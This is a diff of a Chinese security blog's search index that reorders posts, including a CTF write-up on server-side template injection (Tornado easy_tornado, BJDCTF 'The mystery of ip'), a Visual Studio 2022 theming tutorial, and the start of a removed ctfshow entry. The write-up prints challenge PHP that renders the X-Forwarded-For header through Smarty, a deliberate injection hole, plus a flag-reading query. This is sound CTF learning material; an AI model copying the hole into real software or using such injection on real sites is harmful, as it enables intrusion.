@@ -1192,6 +1192,78 @@ aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
       </tags>
   </entry>
   <entry>
+    <title>SSTI模板注入</title>
+    <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述" /></p>
+<h2 id="护网杯-2018easy_tornado"><a class="markdownIt-Anchor" href="#护网杯-2018easy_tornado"></a> [护网杯 2018]easy_tornado</h2>
+<p>ssti 注入点在 msg<br />
+注入49出现 orz 应该是有过滤</p>
+1正常
+<p>hint 里缺 cookie_secret<br />
+该项在 handler.settings</p>
+<blockquote>
+<p>Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象<br />
+RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性<br />
+handler 指向 RequestHandler<br />
+而 RequestHandler.settings 又指向 self.application.settings<br />
+所有 handler.settings 就指向 RequestHandler.application.settings 了！</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ac2991bc7e1e4e64b87451461cb17916.png" alt="在这里插入图片描述" />然后按 hint 里的 MD5 加密过后传参<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3ee21ded82d8493baba4f8b5b940927a.png" alt="在这里插入图片描述" /></p>
+<figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">?</span><span style="color: #E1E4E8">filename=/fllllllllllllag&amp;filehash</span><span style="color: #F97583">=</span><span style="color: #9ECBFF">ff92d5623223cadc00efabfc7676f9fe</span></span></code></pre></div></div></figure>
+<p>filehash 不同 请自行加密<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c860336ae81a4d6e8c52328bf1ae378c.png" alt="在这里插入图片描述" /></p>
+<h2 id="bjdctf2020the-mystery-of-ip"><a class="markdownIt-Anchor" href="#bjdctf2020the-mystery-of-ip"></a> [BJDCTF2020]The mystery of ip</h2>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ec82c70c7fdf49b698f9095bda0d1662.png" alt="在这里插入图片描述" /></p>
+<figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">&lt;?</span><span style="color: #79B8FF">php</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">require_once</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;header.php&#39;</span><span style="color: #E1E4E8">);</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">require_once</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;./libs/Smarty.class.php&#39;</span><span style="color: #E1E4E8">);</span></span>
+<span class="line"><span style="color: #E1E4E8">	$smarty </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">new</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">Smarty</span><span style="color: #E1E4E8">();</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> (</span><span style="color: #F97583">!</span><span style="color: #79B8FF">empty</span><span style="color: #E1E4E8">($_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_CLIENT_IP&#39;</span><span style="color: #E1E4E8">]))</span></span>
+<span class="line"><span style="color: #E1E4E8">	{</span></span>
+<span class="line"><span style="color: #E1E4E8">		   $ip</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">$_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_CLIENT_IP&#39;</span><span style="color: #E1E4E8">];</span></span>
+<span class="line"><span style="color: #E1E4E8">	}</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">elseif</span><span style="color: #E1E4E8"> (</span><span style="color: #F97583">!</span><span style="color: #79B8FF">empty</span><span style="color: #E1E4E8">($_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span style="color: #E1E4E8">]))</span></span>
+<span class="line"><span style="color: #E1E4E8">	{</span></span>
+<span class="line"><span style="color: #E1E4E8">	    $ip</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">$_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span style="color: #E1E4E8">];</span></span>
+<span class="line"><span style="color: #E1E4E8">	}</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">else</span></span>
+<span class="line"><span style="color: #E1E4E8">	{</span></span>
+<span class="line"><span style="color: #E1E4E8">	    $ip</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">$_SERVER[</span><span style="color: #9ECBFF">&#39;REMOTE_ADDR&#39;</span><span style="color: #E1E4E8">];</span></span>
+<span class="line"><span style="color: #E1E4E8">	}</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #6A737D">//$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #79B8FF">echo</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">container panel1</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">row</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">col-md-4</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">col-md-4</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">jumbotron pan</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">					&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">form-group log</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">						&lt;label&gt;&lt;h2&gt;Your IP is : &quot;</span><span style="color: #E1E4E8">;</span></span>
+<span class="line"><span style="color: #E1E4E8">	$smarty</span><span style="color: #F97583">-&gt;</span><span style="color: #B392F0">display</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&quot;string:&quot;</span><span style="color: #F97583">.</span><span style="color: #E1E4E8">$ip);</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #79B8FF">echo</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;				&lt;/h2&gt;&lt;/label&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">					&lt;/div&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">col-md-4</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
+<span class="line"><span style="color: #9ECBFF">			&lt;/div&gt;&quot;</span><span style="color: #E1E4E8">;</span></span>
+<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">?&gt;</span></span></code></pre></div></div></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/eb0e52d7b7f74ac1bb74f7c38b4ca72f.png" alt="在这里插入图片描述" /></p>
+<h2 id="bjdctf2020cookie-is-so-stable"><a class="markdownIt-Anchor" href="#bjdctf2020cookie-is-so-stable"></a> [BJDCTF2020]Cookie is so stable</h2>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f568432cbffb4e5f9603858a0cfa797d.png" alt="在这里插入图片描述" /></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>SSTI</tag>
+        <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PyJail python沙箱逃逸探究</title>
     <url>/2023/02/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
     <content><![CDATA[<h2 id="python-特性"><a class="markdownIt-Anchor" href="#python-特性"></a> python 特性</h2>
@@ -1276,75 +1348,31 @@ aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
       </tags>
   </entry>
   <entry>
-    <title>SSTI模板注入</title>
-    <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述" /></p>
-<h2 id="护网杯-2018easy_tornado"><a class="markdownIt-Anchor" href="#护网杯-2018easy_tornado"></a> [护网杯 2018]easy_tornado</h2>
-<p>ssti 注入点在 msg<br />
-注入49出现 orz 应该是有过滤</p>
-1正常
-<p>hint 里缺 cookie_secret<br />
-该项在 handler.settings</p>
-<blockquote>
-<p>Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象<br />
-RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性<br />
-handler 指向 RequestHandler<br />
-而 RequestHandler.settings 又指向 self.application.settings<br />
-所有 handler.settings 就指向 RequestHandler.application.settings 了！</p>
-</blockquote>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ac2991bc7e1e4e64b87451461cb17916.png" alt="在这里插入图片描述" />然后按 hint 里的 MD5 加密过后传参<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3ee21ded82d8493baba4f8b5b940927a.png" alt="在这里插入图片描述" /></p>
-<figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">?</span><span style="color: #E1E4E8">filename=/fllllllllllllag&amp;filehash</span><span style="color: #F97583">=</span><span style="color: #9ECBFF">ff92d5623223cadc00efabfc7676f9fe</span></span></code></pre></div></div></figure>
-<p>filehash 不同 请自行加密<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c860336ae81a4d6e8c52328bf1ae378c.png" alt="在这里插入图片描述" /></p>
-<h2 id="bjdctf2020the-mystery-of-ip"><a class="markdownIt-Anchor" href="#bjdctf2020the-mystery-of-ip"></a> [BJDCTF2020]The mystery of ip</h2>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ec82c70c7fdf49b698f9095bda0d1662.png" alt="在这里插入图片描述" /></p>
-<figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">&lt;?</span><span style="color: #79B8FF">php</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">require_once</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;header.php&#39;</span><span style="color: #E1E4E8">);</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">require_once</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;./libs/Smarty.class.php&#39;</span><span style="color: #E1E4E8">);</span></span>
-<span class="line"><span style="color: #E1E4E8">	$smarty </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">new</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">Smarty</span><span style="color: #E1E4E8">();</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> (</span><span style="color: #F97583">!</span><span style="color: #79B8FF">empty</span><span style="color: #E1E4E8">($_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_CLIENT_IP&#39;</span><span style="color: #E1E4E8">]))</span></span>
-<span class="line"><span style="color: #E1E4E8">	{</span></span>
-<span class="line"><span style="color: #E1E4E8">		   $ip</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">$_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_CLIENT_IP&#39;</span><span style="color: #E1E4E8">];</span></span>
-<span class="line"><span style="color: #E1E4E8">	}</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">elseif</span><span style="color: #E1E4E8"> (</span><span style="color: #F97583">!</span><span style="color: #79B8FF">empty</span><span style="color: #E1E4E8">($_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span style="color: #E1E4E8">]))</span></span>
-<span class="line"><span style="color: #E1E4E8">	{</span></span>
-<span class="line"><span style="color: #E1E4E8">	    $ip</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">$_SERVER[</span><span style="color: #9ECBFF">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span style="color: #E1E4E8">];</span></span>
-<span class="line"><span style="color: #E1E4E8">	}</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">else</span></span>
-<span class="line"><span style="color: #E1E4E8">	{</span></span>
-<span class="line"><span style="color: #E1E4E8">	    $ip</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">$_SERVER[</span><span style="color: #9ECBFF">&#39;REMOTE_ADDR&#39;</span><span style="color: #E1E4E8">];</span></span>
-<span class="line"><span style="color: #E1E4E8">	}</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #6A737D">//$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #79B8FF">echo</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">container panel1</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">row</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">col-md-4</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">col-md-4</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">jumbotron pan</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">					&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">form-group log</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">						&lt;label&gt;&lt;h2&gt;Your IP is : &quot;</span><span style="color: #E1E4E8">;</span></span>
-<span class="line"><span style="color: #E1E4E8">	$smarty</span><span style="color: #F97583">-&gt;</span><span style="color: #B392F0">display</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&quot;string:&quot;</span><span style="color: #F97583">.</span><span style="color: #E1E4E8">$ip);</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #79B8FF">echo</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;				&lt;/h2&gt;&lt;/label&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">					&lt;/div&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;div class=</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">col-md-4</span><span style="color: #79B8FF">\&quot;</span><span style="color: #9ECBFF">&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">				&lt;/div&gt;</span></span>
-<span class="line"><span style="color: #9ECBFF">			&lt;/div&gt;&quot;</span><span style="color: #E1E4E8">;</span></span>
-<span class="line"><span style="color: #E1E4E8">	</span><span style="color: #F97583">?&gt;</span></span></code></pre></div></div></figure>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/eb0e52d7b7f74ac1bb74f7c38b4ca72f.png" alt="在这里插入图片描述" /></p>
-<h2 id="bjdctf2020cookie-is-so-stable"><a class="markdownIt-Anchor" href="#bjdctf2020cookie-is-so-stable"></a> [BJDCTF2020]Cookie is so stable</h2>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f568432cbffb4e5f9603858a0cfa797d.png" alt="在这里插入图片描述" /></p>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动" /></p>
+<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
+<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动" /></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png" /></p>
+<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
+<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动" /></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动" /></p>
+<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动" /></p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>教程</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>SSTI</tag>
-        <tag>模板注入</tag>
+        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -1500,34 +1528,6 @@ ai说post那个地方可以用</p>
         <tag>web</tag>
         <tag>CTF复现</tag>
         <tag>UofTCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动" /></p>
-<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
-<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
-<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
-<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
-<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
-<p>新建项目 C#里面最后一项</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动" /></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png" /></p>
-<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
-<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动" /></p>
-<p>这个插件是为后面设置背景图片准备</p>
-<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动" /></p>
-<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动" /></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -2040,106 +2040,6 @@ ai说post那个地方可以用</p>
       </tags>
   </entry>
   <entry>
-    <title>ctfshow黑盒测试</title>
-    <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h2 id="web380"><a class="markdownIt-Anchor" href="#web380"></a> web380</h2>
-<p>先看源码没发现啥</p>
-<p>然后再点点看看功能</p>
-<p>发现文章页的格式为</p>
-<p><code>page_n.php</code></p>
-<p>猜测为 sql 注入</p>
